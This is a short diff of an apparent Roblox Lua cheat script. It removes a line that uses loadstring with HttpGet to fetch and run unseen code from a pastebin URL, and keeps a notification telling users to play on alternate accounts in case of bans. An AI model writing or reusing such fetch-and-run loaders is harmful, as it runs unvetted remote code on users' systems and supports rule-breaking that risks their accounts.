@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://pastebin.com/raw/XWuqQiWg", true))()
+
 game.StarterGui:SetCore("SendNotification", {
 Title = "Use alts";
 Text = "if you get ban that's not my problem";
